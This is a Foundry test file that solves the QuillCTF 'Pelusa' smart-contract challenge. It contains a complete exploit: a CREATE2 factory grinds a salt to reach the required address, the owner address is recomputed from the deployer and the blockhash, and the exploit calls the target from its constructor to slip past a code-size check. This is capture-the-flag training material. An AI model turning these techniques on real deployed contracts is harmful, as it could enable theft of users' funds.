// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/Pelusa.sol";

contract PelusaTest is Test {
    Pelusa public pelusa;
    Exploit public exploit;
    Factory factory;

    address public deployer;
    address public attacker;
    address public deployedExploit;
    address public owner;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);

        vm.startPrank(deployer);
        pelusa = new Pelusa();
        factory = new Factory();
        vm.stopPrank();
        
        vm.startPrank(attacker, attacker);
        owner = address(uint160(uint256(keccak256(abi.encodePacked(deployer, blockhash(block.number))))));
        bytes32 _salt = findSaltForCondition(address(pelusa), owner);
        deployedExploit = factory.deploy(_salt, address(pelusa), owner);
        vm.stopPrank();
    }

    function findSaltForCondition(address _pelusa, address _owner) public view returns (bytes32) {
        bytes32 salt;
        for (uint256 i = 0; i < 100000; i++) {
            salt = bytes32(i);
            address predictedAddress = factory.predictAddress(address(factory), salt, _pelusa, _owner);
            uint256 addressAsUint = uint256(uint160(predictedAddress));
            if (addressAsUint % 100 == 10) {
                return salt;
            }
        }
        revert("No suitable salt found");
    }

    function testPelusaExploit() public {
        // Exploit
        vm.prank(attacker);
        Exploit(deployedExploit).attack();
    }
}

contract Exploit {
    address public pelusa;
    address public owner;

    constructor(address _pelusa, address _owner) {
        pelusa = _pelusa;
        owner = _owner;
        Pelusa(pelusa).passTheBall();
    }

    function getBallPossesion() external view returns (address) {
        return owner;
    }

    function attack() external {
        Pelusa(pelusa).shoot();        
    }

    function handOfGod() external pure returns (bytes32) {
        uint256 value = 22_06_1986;
        return bytes32(abi.encodePacked(value));
    }
}
 
contract Factory {
    // Use `CREATE2` to deploy contract
    function deploy(bytes32 salt, address pelusa, address owner) public returns (address) {
        address deployedAddress;
        bytes memory bytecode = abi.encodePacked(
            type(Exploit).creationCode,
            abi.encode(pelusa, owner)
        );
        assembly {
            deployedAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        return deployedAddress;
    }
    
    // Predict `CREATE2` deployed address
    function predictAddress(address deployer, bytes32 salt, address pelusa, address owner) public pure returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Exploit).creationCode,
            abi.encode(pelusa, owner)
        );
        bytes32 _hash = keccak256(abi.encodePacked(
            hex"ff",
            deployer,
            salt,
            keccak256(bytecode)
        ));
        return address(uint160(uint256(_hash)));
    }
}